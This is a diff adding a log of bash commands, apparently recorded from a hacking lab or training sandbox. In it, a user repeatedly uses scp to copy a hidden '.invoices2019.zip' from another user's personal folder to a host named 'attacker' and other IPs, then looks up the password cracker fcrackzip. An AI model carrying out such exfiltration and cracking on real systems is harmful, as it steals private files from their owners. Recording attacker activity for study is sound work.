@@ -1,0 +1,16 @@
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:27:15.911Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /home/root/hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:27:48.515Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:27:52.837Z", "cmd_type": "bash-command", "cmd": "hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:27:58.479Z", "cmd_type": "bash-command", "cmd": "cd hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:28:00.766Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:28:28.986Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:28:34.035Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:28:43.082Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ./"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:28:48.856Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:30:05.109Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@attacker:/home/roor/hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:31:12.072Z", "cmd_type": "bash-command", "cmd": "hostname -I"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:31:27.403Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@attacker:/home/root/hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:32:00.498Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@10.1.26.23:/home/root/hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:32:32.980Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@192.168.129.44:/home/root/hacking"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:32:53.676Z", "cmd_type": "bash-command", "cmd": "scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /"}
+{"sandbox_id": "106", "timestamp_str": "2021-01-14T10:33:20.968Z", "cmd_type": "bash-command", "cmd": "man fcrackzip"}
